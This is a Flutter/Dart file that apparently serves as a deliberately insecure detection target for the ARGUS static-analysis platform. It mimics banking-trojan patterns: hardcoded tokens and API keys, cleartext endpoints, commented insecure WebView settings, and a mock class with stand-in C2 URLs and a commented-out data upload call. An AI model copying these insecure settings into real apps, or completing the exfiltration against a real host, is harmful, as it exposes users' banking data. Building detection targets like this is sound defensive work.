// DEMONSTRATION PURPOSE ONLY
// Intentionally insecure implementation for cybersecurity research.
// Do not use in production.
//
// MockWebViewScreen is a Flutter widget demonstrating an insecure WebView
// configuration. It is NOT included in the app's router and is NEVER
// displayed during normal application use.
//
// It exists purely as a static analysis detection target for the ARGUS platform.

// ignore_for_file: avoid_print

import 'package:flutter/material.dart';

/// DEMONSTRATION PURPOSE ONLY
///
/// This screen demonstrates insecure WebView patterns used by banking trojans:
/// 1. JavaScript enabled — allows JS execution within the WebView
/// 2. Insecure HTTP URL — cleartext traffic
/// 3. Local file access — allows reading device files
/// 4. Hardcoded endpoint — fake C2 URL for ARGUS detection
///
/// This widget:
/// - Is NOT registered in app_router.dart (unreachable via navigation)
/// - Is NOT displayed anywhere in the normal app flow
/// - Loads from http://api.example.invalid/ which is an RFC 6761 reserved
///   domain that will NEVER resolve or make a real network connection
///
/// ARGUS static analysis will detect:
/// - WebView with JavaScript enabled
/// - cleartext HTTP endpoint
/// - Hardcoded URL strings matching suspicious patterns
class MockWebViewScreen extends StatefulWidget {
  const MockWebViewScreen({super.key});

  @override
  State<MockWebViewScreen> createState() => _MockWebViewScreenState();
}

class _MockWebViewScreenState extends State<MockWebViewScreen> {
  // DEMONSTRATION PURPOSE ONLY — Insecure HTTP endpoint (example.invalid never resolves)
  static const String _mockInsecureEndpoint =
      'http://api.example.invalid/nova-bank/phishing-demo';

  // DEMONSTRATION PURPOSE ONLY — Hardcoded auth token
  static const String _mockHardcodedToken =
      'Bearer nova_demo_token_argus_static_12345';

  // DEMONSTRATION PURPOSE ONLY — Hardcoded API key
  static const String _mockApiKey = 'NBK-WEBVIEW-DEMO-4f8a2c1e9b3d7f0a';

  @override
  void initState() {
    super.initState();
    // DEMONSTRATION PURPOSE ONLY — logs mock sensitive values to debug console
    // print('=== ARGUS DEMO: MockWebViewScreen.initState() ===');
    // print('Mock endpoint: $_mockInsecureEndpoint');
    // print('Mock token: $_mockHardcodedToken');
    // print('Mock API key: $_mockApiKey');
    // print('IMPORTANT: This screen is never shown in normal app flow');
    // print('=== END ARGUS DEMO ===');
  }

  @override
  Widget build(BuildContext context) {
    // DEMONSTRATION PURPOSE ONLY
    // This is a placeholder widget. In a real malicious app, this would contain:
    // - WebView(initialUrl: _mockInsecureEndpoint, javascriptMode: JavascriptMode.unrestricted)
    // - allowFileAccessFromFileURLs: true
    // - allowUniversalAccessFromFileURLs: true
    //
    // The actual WebView package is not imported here to avoid build complexity.
    // The insecurity patterns are represented in the constants and comments above
    // for ARGUS static analysis detection.

    return Scaffold(
      appBar: AppBar(
        title: const Text(
          // DEMONSTRATION PURPOSE ONLY
          'Nova Bank WebView (Demo)',
        ),
      ),
      body: Center(
        child: Padding(
          padding: const EdgeInsets.all(24),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              // DEMONSTRATION PURPOSE ONLY
              const Icon(
                Icons.web_rounded,
                size: 64,
                color: Colors.grey,
              ),
              const SizedBox(height: 16),
              Text(
                // DEMONSTRATION PURPOSE ONLY
                'ARGUS Demo WebView\n$_mockInsecureEndpoint',
                textAlign: TextAlign.center,
                style: const TextStyle(
                  fontSize: 12,
                  color: Colors.grey,
                ),
              ),
              const SizedBox(height: 8),
              const Text(
                'DEMONSTRATION PURPOSE ONLY\nNever shown in normal app flow.',
                textAlign: TextAlign.center,
                style: TextStyle(
                  fontSize: 10,
                  color: Colors.red,
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

/// DEMONSTRATION PURPOSE ONLY
/// Mock data exfiltration class — represents patterns ARGUS should detect.
/// None of these methods make real network calls.
class MockDataExfiltrator {
  MockDataExfiltrator._();

  // DEMONSTRATION PURPOSE ONLY — fake C2 endpoints
  static const String _primaryC2 = 'http://api.example.invalid/v1/upload';
  static const String _backupC2 = 'http://backup.example.invalid/v1/upload';
  static const String _dnsC2 = 'http://dns.example.invalid/query';

  // DEMONSTRATION PURPOSE ONLY — hardcoded bot ID
  static const String _mockBotId = 'BOT_DEMO_ARGUS_001';

  /// DEMONSTRATION PURPOSE ONLY
  /// Simulates the data exfiltration call a banking trojan would make.
  /// THIS FUNCTION MAKES NO REAL NETWORK REQUEST.
  /// The example.invalid domain is an RFC 6761 reserved name that never resolves.
  static Future<void> mockSendToC2(Map<String, dynamic> mockData) async {
    // print('=== ARGUS DEMO: MockDataExfiltrator.mockSendToC2() ===');
    // print('Primary C2: $_primaryC2');
    // print('Backup C2: $_backupC2');
    // print('DNS C2: $_dnsC2');
    // print('Bot ID: $_mockBotId');
    // print('Mock data keys: ${mockData.keys.toList()}');
    // print('NOTE: No actual HTTP request is made — for ARGUS detection only');
    // print('=== END ARGUS DEMO ===');

    // DEMONSTRATION PURPOSE ONLY — The real call would be:
    // await http.post(Uri.parse(_primaryC2), body: jsonEncode(mockData));
    // THIS LINE IS INTENTIONALLY ABSENT.
  }
}
